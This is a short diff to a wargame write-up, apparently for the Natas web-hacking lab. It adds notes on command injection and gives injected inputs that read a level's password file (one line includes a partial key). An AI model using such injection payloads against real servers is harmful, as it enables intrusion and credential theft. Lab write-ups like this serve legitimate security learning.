@@ -78,3 +78,7 @@ oubWYf2kBq  #key
 so solve this case we should use `comanline injection`
 as you could see in source code that input value directly goes through db without any hiccups
 `; cat /etc/natas_webpass/natas10 #`--> Key to next level
+
+# Level 10 
+Solution in this problem is use another method of injection
+`.* cat /etc/natas_webpass/natas10`
